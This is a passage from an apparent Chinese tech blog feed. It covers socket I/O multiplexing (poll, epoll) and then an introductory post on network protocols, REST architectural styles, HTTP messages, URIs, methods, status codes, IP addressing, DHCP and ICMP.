事件，检测完成以后，所对应的“returned events”的成员值也将设置为 0</p></li><li><p>对比：在 select 里面，文件描述符的个数已经随着 fd_set 的实现而固定，没有办法对此进行配置；而在 poll 函数里，可以控制 pollfd 结构的数组大小，这意味着<strong>突破原来 select 函数最大描述符的限制</strong>，在这种情况下，应用程序调用者需要分配 pollfd 数组并通知 poll 函数该数组的大小</p></li></ul><h3 id="非阻塞-I-O">非阻塞 I/O</h3><ul><li><p>读操作</p><ul><li>如果套接字对应的接收缓冲区没有数据可读，在非阻塞情况下 read 调用会立即返回，一般返回 EWOULDBLOCK 或 EAGAIN 出错信息</li></ul></li><li><p>写操作</p><ul><li><p>在非阻塞 I/O 的情况下，如果套接字的发送缓冲区已达到了极限，不能容纳更多的字节，那么操作系统内核会<strong>尽最大可能</strong>从应用程序拷贝数据到发送缓冲区中，并立即从 write 等函数调用中返回</p><ul><li><p>返回值告诉应用程序到底有多少数据被成功拷贝到了发送缓冲区中</p></li><li><p>write 等函数是可以同时作用到阻塞 I/O 和非阻塞 I/O 上的，为了复用一个函数，处理非阻塞和阻塞 I/O 多种情况，设计出了写入返回值，并用这个返回值表示实际写入的数据大小</p></li></ul></li><li><p>在实战中，可以不用区别阻塞和非阻塞 I/O，使用循环的方式来写入数据就好了</p></li></ul></li></ul><h4 id="accept-2">accept</h4><ul><li>一定要将监听套接字设置为非阻塞的</li></ul><h3 id="epoll">epoll</h3><ul><li><p>epoll 的历史</p><ul><li>Linux 在 2002 年引入了 epoll</li></ul></li><li><p>本质上 epoll 还是一种 <strong>I/O 多路复用</strong>技术， epoll 通过监控注册的多个描述字，来进行 I/O 事件的分发处理</p><ul><li>不同于 poll 的是，epoll 不仅提供了默认的 level-triggered（条件触发）机制，还提供了性能更为强劲的 edge-triggered（边缘触发）机制</li></ul></li><li><p>使用 epoll 进行网络程序的编写，需要三个步骤：epoll_create，epoll_ctl 和 epoll_wait</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">epoll_create</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">epoll_create1</span><span class="token punctuation">(</span><span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">epoll_ctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> epfd<span class="token punctuation">,</span> <span class="token keyword">int</span> op<span class="token punctuation">,</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">epoll_event</span> <span class="token operator">*</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">epoll_wait</span><span class="token punctuation">(</span><span class="token keyword">int</span> epfd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">epoll_event</span> <span class="token operator">*</span>events<span class="token punctuation">,</span> <span class="token keyword">int</span> maxevents<span class="token punctuation">,</span> <span class="token keyword">int</span> timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>一般认为边缘触发的效率比条件触发的效率要高，<strong>边缘触发</strong>只有第一次满足条件的时候才触发，之后就不会再传递同样的事件了</p></li></ul><blockquote><p>未完待续</p></blockquote><h2 id="参考">参考</h2><ul><li><a href="https://zh.m.wikipedia.org/zh-hans/%E4%BF%9D%E7%95%99IP%E5%9C%B0%E5%9D%80">保留IP地址</a></li><li><a href="https://shuangxunian.github.io/2021/06/13/TCPInterviewQuestions/">TCP面试题</a></li><li><a href="https://jaminzhang.github.io/dns/The-Reason-of-There-Is-Only-13-DNS-Root-Servers/">只有 13 台 DNS 根域名服务器原因</a></li><li><a href="https://blog.csdn.net/wdscq1234/article/details/52432095">TCP-IP详解：Nagle算法</a></li><li><a href="https://switch-router.gitee.io/blog/reuseport/">Linux 内核中 reuseport 的演进</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 网络协议 </tag>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络协议基础入门</title>
      <link href="2021/02/04/cs-network-protocol/"/>
      <url>2021/02/04/cs-network-protocol/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p><strong>看似最枯燥、最基础的东西往往具有最长久的生命力</strong></p><p>​</p><p>​</p><h3 id="网络协议">网络协议</h3><ul><li><p>网络协议（Network Protocol），简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定</p></li><li><p>Internet 中涉及两个或多个通信远程实体的所有活动都由协议管理，协议规范了网络中所有信息发送和接收过程</p></li><li><p>协议规定了通信实体之间所交换消息的<strong>格式、意义、顺序</strong>以及针对收到信息或发生的事件所采取的<strong>动作</strong></p><blockquote><p><em>A protocol defines the format and the order of messages exchanged between two or more communicating entities, as well as the actions taken on the transmission and/or receipt of a message or other event.</em></p></blockquote></li></ul><h4 id="协议三要素">协议三要素</h4><ul><li>语法（<strong>Syntax</strong>）<ul><li>数据与控制信息的结构或格式</li><li>信号电平</li></ul></li><li>语义（<strong>Semantics</strong>）<ul><li>需要发出何种控制信息</li><li>完成何种动作以及做出何种响应</li></ul></li><li>时序（<strong>Timing</strong>）<ul><li>事件顺序</li><li>速度匹配</li></ul></li></ul><p>​</p><p>​</p><h3 id="网络分层">网络分层</h3><ul><li><a href="https://night-candle.github.io/2021/02/04/cs-network-socket/#OSI-%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B">OSI 概念模型</a></li><li>OSI 与 TCP/IP 模型对照</li></ul><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-network-model.png" style="zoom: 80%;"><ul><li><p>网络分层的优点：</p><ul><li><p>各层之间是独立的，某一层并不需要知道它下一层如何实现，而仅仅需要知道该层通过层间的接口所提供的服务</p></li><li><p>灵活性好，当任何一层发生变化时，只要<strong>层间接口关系保持不变，则在这层以上或以下各层均不受影响</strong></p><blockquote><p>传输层是 IPv4 或 IPv6，链路层是否仍使用1500字节的 MTU 对应用层没有影响</p></blockquote></li><li><p>结构上可分割开、易于实现和维护、能促进标准化工作</p></li></ul></li><li><p>层与层的关系：<strong>只要是在网络上的包都是完整的，可以有下层没上层，但不可有上层没下层</strong>，无论这个包经过哪些设备，它都是完整的，所谓二层设备、三层设备，都是这些设备上跑的程序不同而已，一个 HTTP 协议的包经过一个二层设备，二层设备收进去的是整个网络包</p></li></ul><h3 id="架构设计">架构设计</h3><h4 id="设计原则">设计原则</h4><h5 id="关键架构属性">关键架构属性</h5><ul><li>性能 Performance：影响高可用的关键因素</li><li>可伸缩性 Scalability：支持部署可以互相交互的大量组件</li><li>简单性 Simplicity：易理解、易实现、易验证</li><li>可见性 Visiable：对两个组件间的交互进行监视或者仲裁的能力。如缓存、分层设计等</li><li>可移植性 Portability：在不同的环境下运行的能力</li><li>可靠性 Reliability：出现部分故障时，对整体影响的程度</li><li>可修改性 Modifiability：对系统作出修改的难易程度，由可进化性、可定制性、可扩展性、可配置性、可重用性构成</li></ul><h5 id="性能">性能</h5><ul><li><p>网络性能 <code>Network Performance</code></p><ul><li><p><code>Throughput</code> 吞吐量：小于等于带宽 bandwidth</p></li><li><p><code>Overhead</code> 开销：首次开销，每次开销</p></li></ul></li><li><p>用户感知到的性能 <code>User-perceived Performance</code></p><ul><li><p><code>Latency</code> 延迟：发起请求到接收到响应的时间</p></li><li><p><code>Completion</code> 完成时间：完成一个应用动作所花费的时间</p></li></ul></li><li><p>网络效率 <code>Network Efficiency</code></p><ul><li>重用缓存、减少交互次数、数据传输距离更近、COD</li></ul></li></ul><p>​</p><h5 id="可修改性">可修改性</h5><ul><li><p>可进化性 Evolvability：一个组件独立升级而不影响其他组件</p></li><li><p>可扩展性 Extensibility ：向系统添加功能，而不会影响到系统的其他部分</p></li><li><p>可定制性 Customizability ：临时性、定制性地更改某一要素来提供服务，不对常规客户产生影响</p></li><li><p>可配置性 Configurability ：应用部署后可通过修改配置提供新的功能</p></li><li><p>可重用性 Reusabilit ：组件可以不做修改在其他应用在使用</p></li></ul><p>​</p><h4 id="架构风格">架构风格</h4><h5 id="数据流风格">数据流风格</h5><ul><li><p>数据流风格 <code>Data-flow Styles</code></p></li><li><p>优点：简单性、可进化性、可扩展性、可配置性、可重用性</p></li><li><p>管道与过滤器（Pipe And Filter，PF）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-pf.png" alt=""></p><ul><li>每个 Filter 都有输入端和输出端，只能从输入端读取数据，处理后再从输出端产生数据</li></ul></li><li><p>统一接口的管道与过滤器（Uniform Pipe And Filter，UPF）</p><ul><li>在 PF 上增加了统一接口的约束，所有 Filter 过滤器必须具备同样的接口</li></ul></li><li><p>两种架构对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-pf-and-upf.png" alt=""></p></li><li><p>例如：协议分层</p></li></ul><h5 id="复制风格">复制风格</h5><ul><li><p>复制风格 <code>Replication Styles</code></p></li><li><p>优点：用户可察觉的性能、可伸缩性，网络效率、可靠性也可以提到提升</p></li><li><p>复制仓库（Replicated Repository, RR）</p><ul><li>多个进程提供相同的服务，通过反向代理对外提供集中服务</li><li>例如：MySQL 冷热备份</li></ul></li><li><p>缓存 $</p><ul><li>RR 的变体，通过复制请求的结果，为后续请求复用</li></ul></li><li><p>两种架构对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-rr-and-cache.png" alt=""></p></li></ul><h5 id="分层风格">分层风格</h5><ul><li><p>分层风格 <code>Hierarchical Styles</code></p></li><li><p>优点：简单性、可进化性、可伸缩性</p></li><li><p>客户端服务器（Client-Server，CS）</p><ul><li>由 Client 触发请求，Server 监听到请求后产生响应，Client 一直等待收到响应后，会话结束</li><li>分离关注点隐藏细节，良好的简单性、可伸缩性、可进化性</li><li>示例：<a href="https://night-candle.github.io/2021/02/04/cs-network-socket/#1-1-1-%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B">客户端 - 服务器网络模型</a></li></ul></li><li><p>分层系统（Layered System，LS）</p><ul><li>每一层为其之上的层服务，并使用在其之下的层所提供的服务</li><li>例如 TCP/IP</li></ul></li><li><p>分层客户端服务器（Layered Client-Server，LCS）</p><ul><li>LS+CS</li><li>例如正向代理和反向代理，从空间上分为外部层与内部层</li></ul></li><li><p>无状态、客户端服务器（Client-Stateless-Server，CSS）</p><ul><li><p>基于 CS，服务器上不允许有session state会话状态</p></li><li><p>提升了可见性、可伸缩性、可靠性，但重复数据导致降低网络性能</p></li></ul></li><li><p>缓存、无状态、客户端服务器（Client-Cache-Stateless-Server，C$SS）</p><ul><li>提升性能</li></ul></li><li><p>分层、缓存、无状态、客户端服务器（Layered-Client-Cache-Stateless-Server，LC$SS）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-LC%24SS.png" alt=""></p></li><li><p>远程会话（<strong>Remote Session</strong>，RS）</p><ul><li>CS 变体，服务器保存应用状态（Application state）</li><li>可伸缩性、可见性差</li><li>例如：FTP</li></ul></li><li><p>远程数据访问（<strong>Remote Data Access</strong>，RDA）</p><ul><li><p>CS 变体， Application state 应用状态同时分布在客户端与服务器</p></li><li><p>巨大的数据集有可能通过迭代而减少</p></li><li><p>简单性、可伸缩性差</p></li><li><p>例如：SQL 访问数据库</p></li></ul></li><li><p>对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-hierarchical-styles.png" alt=""></p></li></ul><h5 id="移动代码风格">移动代码风格</h5><ul><li><p>移动代码风格 <code>Mobile Code Styles</code>，执行的代码可移动</p></li><li><p>优点：可移植性、可扩展性、网络效率</p></li><li><p>虚拟机（Virtual Machine，VM）</p><ul><li>分离指令与实现</li></ul></li><li><p>远程求值（Remote Evaluation，REV）</p><ul><li>基于 CS 的 VM，将代码发送至服务器执行</li><li>例如：JS</li></ul></li><li><p>按需代码（Code on Demand，COD）</p><ul><li><p>服务器在响应中发回处理代码，在客户端执行</p></li><li><p>优秀的可扩展性和可配置性，提升用户可察觉性能和网络效率</p></li></ul></li><li><p>分层、按需代码、缓存、无状态、客户端服务器</p><p>（Layered-Code-on-Demand-Client-Cache-Stateless-Server，LCODC$SS）</p><ul><li>LC$SS+COD</li></ul><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-LC%24SS%2BCOD.png" alt="统一接口的 LC$SS+COD"></p></li><li><p>移动代理（Mobile Agent，MA）</p><ul><li>相当于 REV+COD</li></ul></li><li><p>对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-mobile-code-styles.png" alt=""></p></li></ul><h5 id="点对点风格">点对点风格</h5><ul><li><p>点对点风格 <code>Peer-to-Peer Styles</code></p></li><li><p>优点：可进化性、可重用性、可扩展性、可配置性</p></li><li><p>Event-based Integration，EBI：</p><ul><li><p>基于事件集成系统，如由类似 Kafka 这样的消息系统 + 分发订阅来消除耦合</p></li><li><p>优秀的可重用性、可扩展性、可进化性</p></li><li><p>缺乏可理解性，收到一条消息不知道是哪个订阅产生的</p></li><li><p>由于消息广播等因素造成的消息风暴，可伸缩性差</p></li></ul></li><li><p>Chiron-2，C2</p><ul><li>参见论文《A Component- and Message-Based Architectural Style for GUI Software》</li><li>相当于 EBI+LCS，控制了消息的方向</li></ul></li><li><p>Distributed Objects，DO</p><ul><li>组件结对交互</li></ul></li><li><p>Brokered Distributed Objects，BDO</p><ul><li>引入名字解析组件来简化 DO，例如 CORBA</li></ul></li><li><p>对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-peer-to-peer-styles.png" alt=""></p></li></ul><h2 id="应用层">应用层</h2><h3 id="HTTP">HTTP</h3><p>HTTP 协议（<code>Hypertext Transfer Protocol</code>）</p><p>  <em>a stateless application-level request/response protocol that uses extensible semantics and self-descriptive message payloads for flexible interaction with network-based hypertext information systems</em>（RFC7230）</p><p>  一种<strong>无状态</strong>的、应用层的、以<strong>请求/应答方式</strong>运行的协议，它使用<strong>可扩展的语义和自描述消息格式</strong>，与基于网络的<strong>超文本</strong>信息系统灵活的互动</p><p>​</p><h4 id="HTTP-1-的设计">HTTP/1 的设计</h4><h5 id="HTTP-解决了什么问题？">HTTP 解决了什么问题？</h5><ul><li><p><strong>Form Follows Function</strong>：HTTP 协议为什么是现在这个样子？</p><blockquote><p>Web’s major goal was to be a shared information space through which people and machines could communicate. ——<em>Tim Berners Lee</em></p></blockquote></li><li><p>解决 WWW 信息交互必须面对的需求</p><ul><li>低门槛</li><li>可扩展性：巨大的用户群体，超长的寿命</li><li>分布式系统下的 Hypermedia：大粒度数据的网络传输</li><li>Internet 的规模<ul><li>无法控制的 scalability：不可预测的负载、非法格式的数据、恶意消息和客户端不能保持所有服务器信息、服务器不能保持多个请求间的状态信息</li><li>独立的组件部署：新老组件并存</li></ul></li><li>向前兼容：1993 年起 HTTP0.9\1.0（1996）已经被广泛使用</li></ul></li></ul><p>​</p><p>​</p><h5 id="REST-架构">REST 架构</h5><ul><li><p><em>Roy Thomas Fielding</em> 在 2000 年发布指导 HTTP/1.1 规范制订的论文《Architectural Style and the Design of Network-based Software Architectures》，即常说的 Representational State Transfer（REST）架构</p></li><li><p>风格演化</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-evolution.png" alt="推导 REST 架构"></p><blockquote><p>REST：分层、按需代码、缓存、无状态、客户端服务器、统一接口（URL）</p></blockquote></li><li><p>REST 架构下 Web</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-rest.png" alt=""></p></li></ul><h4 id="协议通用规则">协议通用规则</h4><h5 id="消息格式">消息格式</h5><p>基于<strong>ABNF</strong>语义定义的 HTTP 消息格式</p><p><strong>HTTP-message = <font color="#ff8378">start-line</font> *( <font color="#2abfb0">header-field</font> CRLF ) CRLF [ <font color="#83b2cc">message-body</font> ]</strong></p><ul><li><font color="#ff8378"><strong>start-line</strong></font> = request-line / status-line<ul><li>request-line = method SP request-target SP HTTP-version CRLF</li><li>status-line = HTTP-version SP status-code SP reason-phrase CRLF</li></ul></li><li><font color="#2abfb0"><strong>header-field</strong></font> = field-name “:” OWS field-value OWS<ul><li><p>OWS = *( SP / HTAB )</p></li><li><p>field-name = token</p></li><li><p>field-value =  *( field-content / obs-fold ）</p></li></ul></li><li><font color="#83b2cc"><strong>message-body</strong></font> = *OCTET</li></ul><blockquote><p><code>ABNF</code> <strong>扩充巴科斯 - 瑙尔范式</strong>：定义语法的元语言</p><ul><li><p>操作符</p><ul><li>空白字符：用来分隔定义中的各个元素<ul><li>e.g.method SP request-target SP HTTP-version CRLF</li></ul></li><li>选择 <strong>/</strong>：表示多个规则都是可供选择的规则<ul><li>e.g.start-line = request-line / status-line</li></ul></li><li>值范围 <strong>%c##-##</strong><ul><li>e.g.OCTAL = “0” / “1” / “2” / “3” / “4” / “5” / “6” / “7” 与 OCTAL = %x30-37 等价</li></ul></li><li>序列组合 <strong>()</strong>：将规则组合起来，视为单个元素</li><li>不定量重复 <strong>m*n</strong><ul><li>e.g.*元素表示零个或更多元素： *( header-field CRLF )</li><li>e.g.1* 元素表示一个或更多元素，2*4 元素表示两个至四个元素</li></ul></li><li>可选序列 <strong>[]</strong><ul><li>e.g.[ message-body ]</li></ul></li></ul></li><li><p>核心规则</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-core-rules.png" alt=""></p></li></ul></blockquote><ul><li><p>报文示例</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-message-instance.png" alt=""></p></li></ul><h5 id="URI">URI</h5><ul><li><p>URL：<code>Uniform Resource Locator</code>，表示资源的位置， 期望提供查找资源的方法  （RFC1738）</p></li><li><p>URN：<code>Uniform Resource Name</code>，期望为资源提供持久的、位置无关的标识方式，并允许简单地将多个命名空间映射到单个URN命名空间 （RFC2141）</p><ul><li>e.g. <strong>磁力链接</strong></li></ul></li><li><p><strong>URI</strong>：<code>Uniform Resource Identifier</code>，用以区分资源，<strong>是 URL 和 URN 的超集</strong>，用以取代 URL 和 URN 概念 （RFC1630、<a href="https://www.ietf.org/rfc/rfc3986.txt">RFC3986</a>）</p><ul><li><p>Resource 资源</p><ul><li>可以是图片、文档，也可以是不能通过互联网访问的实体，例如人、公司，也可以是抽象的概念，例如亲属关系或者数字符号</li><li>一个资源可以有多个 URI</li></ul></li><li><p>Identifier 标识符</p><ul><li>将当前资源与其他资源区分开的名称</li></ul></li><li><p>Uniform 统一</p><ul><li>允许不同种类的资源在同一上下文中出现</li><li>对不同种类的资源标识符可以使用同一种语义进行解读</li><li>引入新标识符时，不会对已有标识符产生影响</li><li>允许同一资源标识符在不同的、internet 规模下的上下文中出现</li></ul></li></ul></li></ul><p>​</p><ul><li><p><strong>URI 组成</strong>：schema、user information、host、port、path、query、fragment</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210526-URI.png" alt=""></p></li><li><p>URI 编码</p><ul><li>对可能产生歧义性的数据编码（不在 <a href="https://zh.wikipedia.org/wiki/ASCII">ASCII</a> 码范围内字符；ASCII 码中不可显示字符；URI 中规定的保留字符；不安全字符）</li><li>百分号编码的方式</li><li>非 ASCII 码字符：建议先 UTF8 编码，再 US-ASCII 编码</li><li>对 URI 合法字符，编码与不编码是等价的</li></ul></li></ul><p>​</p><h5 id="方法">方法</h5><p><strong>常见方法（RFC7231）</strong></p><ul><li><p><strong>GET</strong>：主要的获取信息方法，大量的性能优化都针对该方法，幂等方法</p></li><li><p>HEAD：类似 GET 方法，但服务器不发送 BODY，用以获取 HEAD 元数据，幂等方法</p></li><li><p><strong>POST</strong>：常用于提交 HTML FORM 表单、新增资源等</p></li><li><p>PUT：更新资源，带条件时是幂等方法</p></li><li><p>DELETE：删除资源，幂等方法</p></li><li><p>CONNECT：建立 tunnel 隧道</p></li><li><p>OPTIONS：显示服务器对访问资源支持的方法，幂等方法</p></li><li><p><s>TRACE</s>：回显服务器收到的请求，用于定位问题，有安全风险</p></li></ul><p>​</p><p><strong>用于文档管理的 WEBDAV 方法（RFC2518）</strong></p><ul><li><p>PROPFIND：从 Web 资源中检索以 XML 格式存储的属性，它也被重载以允许一个检索远程系统的集合结构（也叫目录层次结构）</p></li><li><p>PROPPATCH：在单个原子性动作中更改和删除资源的多个属性</p></li><li><p>MKCOL：创建集合或者目录</p></li><li><p>COPY：将资源从一个 URI 复制到另一个 URI</p></li><li><p>MOVE：将资源从一个 URI 移动到另一个 URI</p></li><li><p>LOCK：锁定一个资源。WebDAV 支持共享锁和互斥锁</p></li><li><p>UNLOCK：解除资源的锁定</p></li></ul><p>​</p><p>​</p><h5 id="响应码">响应码</h5><ul><li><p>响应码规范：RFC6585、RFC7231</p></li><li><p><code>1xx</code>：请求已接收到，需要进一步处理才能完成，HTTP1.0 不支持</p><ul><li><strong>100 Continue</strong>：上传大文件前使用，由客户端发起请求中携带 <code>Expect: 100-continue</code> 头部触发</li><li><strong>101 Switch Protocols</strong>：协议升级使用，由客户端发起请求中携带 <code>Upgrade:</code> 头部触发</li></ul></li><li><p><code>2xx</code>：成功处理请求</p><ul><li><p><strong>200 OK</strong>：成功返回响应</p></li><li><p><strong>201 Created</strong>：有新资源在服务器端被成功创建</p></li><li><p><strong>202 Accepted</strong>：服务器接收并开始处理请求，但请求未处理完成</p></li><li><p><strong>204 No Content</strong>：成功执行了请求且不携带响应包体，并暗示客户端无需更新当前的页面视图</p></li><li><p><strong>205 Reset Content</strong>：成功执行了请求且不携带响应包体，同时指明客户端需要更新当前页面视图（画图）</p></li><li><p><strong>206 Partial Content</strong>：使用 range 协议时返回部分响应内容时的响应码（断点续传）</p></li></ul></li><li><p><code>3xx</code>：重定向使用 Location 指向的资源或者缓存中的资源，在 RFC2068 中规定客户端重定向次数不应超过 5 次，以防止死循环</p><ul><li><strong>301 Moved Permanently</strong>：资源永久性的重定向到另一个 URI 中</li><li><strong>302 Found</strong>：资源临时的重定向到另一个 URI 中</li><li><strong>303 See Other</strong>：重定向到其他资源，常用于 POST/PUT 等方法的响应中</li><li><strong>304 Not Modified</strong>：当客户端拥有可能过期的缓存时，会携带缓存的标识 etag、时间等信息询问服务器缓存是否仍可复用，而304是告诉客户端可以复用缓存</li></ul></li><li><p><code>4xx</code>：客户端出现错误，服务器无法处理请求</p><ul><li><p><strong>403 Forbidden</strong>：服务器理解请求的含义，但没有权限执行此请求</p></li><li><p><strong>404 Not Found</strong>：服务器没有找到对应的资源</p></li><li><p><strong>408 Request Timeout</strong>：服务器接收请求超时</p></li><li><p><strong>415 Unsupported Media Type</strong>：上传的文件类型不被服务器支持</p></li><li><p><strong>416 Range Not Satisfiable</strong>：无法提供 range 请求中指定的那段包体</p></li></ul></li><li><p><code>5xx</code>：服务器端出现错误，服务器处理请求出错</p><ul><li><strong>501 Not Implemented</strong>：服务器不支持实现请求所需要的功能</li><li><strong>502 Bad Gateway</strong>：代理服务器无法获取到合法响应</li><li><strong>503 Service Unavailable</strong>：服务器资源尚未准备好处理当前请求</li><li><strong>504 Gateway Timeout</strong>：代理服务器无法及时的从上游获得响应</li></ul></li></ul><h4 id="连接与消息的路由">连接与消息的路由</h4><h5 id="短连接与长连接">短连接与长连接</h5><p>Host 头部与消息的路由</p><h4 id="内容协商与传输">内容协商与传输</h4><p>每个 URI 指向的资源可以是任何事物，可以有多种不同的表述，例如一份文档可以有不同语言的翻译、不同的媒体格式、可以针对不同的浏览器提供不同的压缩编码等。</p><h4 id="Cookie-的设计与问题">Cookie 的设计与问题</h4><h4 id="缓存的控制">缓存的控制</h4><p>​</p><p>​</p><p>​</p><h3 id="WebSocket">WebSocket</h3><blockquote><p>支持服务器推送消息</p></blockquote><p>WebSocket是基于TCP的应用层协议，用于在C/S架构的应用中实现<strong>双向通信</strong>。RFC6455（2011.12）</p><p>• 双向通讯的优劣？</p><p>• 如何管理会话？</p><p>• 如何维持长连接？</p><p>• 兼容 HTTP 协议</p><p>• 端口复用</p><p>• 支持扩展</p><p>• 如 permessage-deflate 扩展</p><p>建立会话<br>• 消息传输<br>• 心跳<br>• 关闭会话</p><p>​</p><p>​</p><p>​</p><h3 id="HTTP-2-0">HTTP/2.0</h3><p>​</p><p>​</p><p>​</p><h3 id="TLS-SSL">TLS/SSL</h3><blockquote><p>应用层的安全基础设施</p></blockquote><h2 id="传输层">传输层</h2><h3 id="TCP">TCP</h3><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-tcp-development-history.png" alt="发展历史"></p><h4 id="建立连接">建立连接</h4><h4 id="传输数据">传输数据</h4><h4 id="拥塞控制">拥塞控制</h4><h4 id="关闭连接">关闭连接</h4><h3 id="UDP">UDP</h3><p>​</p><p>​</p><h2 id="网络层">网络层</h2><p>​</p><h3 id="IP-协议">IP 协议</h3><h4 id="IP地址">IP地址</h4><ul><li><p><strong>IP 地址是一个网卡在网络世界的通讯地址</strong>，相当于现实世界的门牌号码，有定位功能</p></li><li><p>查看 IP 地址：<code>ifconfig</code>、 <code>ip addr</code>（Linux）</p><blockquote><p>大多数时候这两个命令系统自带，如果登录进入一个被裁剪过的非常小的 Linux 系统中，既没有 ifconfig 命令，也没有 ip addr 命令，可以自行安装 <strong>net-tools</strong> 和 <strong>iproute2</strong> 工具；net-tools 起源于BSD，自2001年起 Linux 社区已经对其停止维护，而 iproute2 旨在取代 net-tools 并提供了一些新功能</p><p>net-tools 通过 <code>procfs(/proc)</code> 和 <code>ioctl</code> 系统调用去访问和改变内核网络配置；iproute2 则通过 <code>netlink</code> 套接字接口与内核通讯</p></blockquote></li></ul><p>​</p><p>​</p><h5 id="IP-地址分类">IP 地址分类</h5><ul><li><p>32 位的 IP 地址被分成了 5 类，A、B、C 类主要分两部分，前面一部分是网络号，后面一部分是主机号</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-ip-classful-addressing.png" alt=""></p></li><li><p>A、B、C 三类地址能包含的主机数量</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210208-number-of-addresses.png" alt=""></p><p><strong>问题</strong>： C 类地址能包含的最大主机数量实在太少了，只有 254 个，而 B 类地址能包含的最大主机数量又太多了，6 万多台机器放在一个网络下面，一般的企业基本达不到这个规模（<strong>无类型域间选路</strong>）</p></li><li><p>公有/私有 IP 地址</p><ul><li><p>上面的表格最右列是私有 IP 地址段，平时看到的数据中心、办公室、家里或学校的 IP 地址一般都是私有 IP 地址段，因为这些地址允许组织内部的 IT 人员自己管理、自己分配，而且可以重复，但是出了内网就需要使用公有 IP 地址</p></li><li><p>表格中的 <strong>192.168.0.x</strong> 是最常用的私有 IP 地址，一般家中上网设备不会超过 256 个，整个网络里面的第一个地址 <strong>192.168.0.1</strong> 往往就是私有网络的出口地址</p></li></ul></li></ul><p>​</p><p>​</p><h5 id="无类型域间选路">无类型域间选路</h5><ul><li>CIDR 将 IP 地址一分为二，前面是网络号，后面是主机号，例如 <strong>10.100.122.2/24</strong> 这种地址表示形式就是 CIDR，32 位中前 24 位是网络号，后 8 位是主机号</li><li>伴随 CIDR 存在的，一个是广播地址，另一个是子网掩码，将子网掩码和 IP 地址按位计算 AND 就可得到网络号</li></ul><p>​</p><p>​</p><h5 id="动态主机配置协议">动态主机配置协议</h5><ul><li><p>需要一个自动配置的协议，解决客户端的机器每次使用都要配置 IP 地址的问题</p></li><li><p>动态主机配置协议（DHCP）主要是用来给客户租用 IP 地址，网络管理员只需要配置一段共享的 IP 地址，每一台新接入的机器都通过 DHCP 协议，来这个共享的 IP 地址里申请，然后自动配置好，用完了还回去</p></li><li><p>DHCP 协议能给客户推荐 <code>PXE</code> 帮助安装操作系统，在云计算领域大有用处</p></li></ul><p>​</p><p>​</p><h3 id="ICMP">ICMP</h3><ul><li><p>ICMP（Internet Control Message Protocol）即互联网控制报文协议，是一种<strong>基于 IP 协议</strong>的控制协议</p></li><li><p>网络包在异常复杂的网络环境中传输时，常常会遇到各种各样的问题，当遇到问题时要传出消息来报告情况，调整传输策略</p></li><li><p><strong>ICMP 报文封装在 IP 包里面</strong>，因为传输指令的时候需要源地址和目标地址</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210405-icmp.png" alt="ICMP 报文"></p></li><li><p>ICMP 在 IP 报文后加入了新的内容</p><ul><li><p>类型：ICMP 报文有很多的类型，不同的类型有不同的代码，其中 ping 的请求类型为 8（主动请求），应答为 0</p></li><li><p>代码：进一步划分 ICMP 的类型, 用来查找产生错误的原因</p></li><li><p>校验和：用于检查错误的数据</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="查询报文类型">查询报文类型</h4><ul><li><p>例如 ping 就是查询报文，是一种主动请求，并且获得主动应答的 ICMP 协议</p></li><li><p>ping 的主动请求称为 <strong>ICMP ECHO REQUEST</strong>；主动请求的回复称为 <strong>ICMP ECHO REPLY</strong>，比起原生的 ICMP，这里面多了两个字段：标识符、顺序号</p></li><li><p>在选项数据中，ping 还会在报文的数据部分插入发送时间，来计算往返时间，说明路程的长短</p></li></ul><p>​</p><p>​</p><h4 id="差错报文类型">差错报文类型</h4><ul><li><p>异常情况发起的，来报告发生了不好的事情，对应 ICMP 的<strong>差错报文类型</strong>，差错报文的结构前面还是 IP，ICMP 的前 8 字节不变，后面则跟上出错的那个 IP 包的 IP 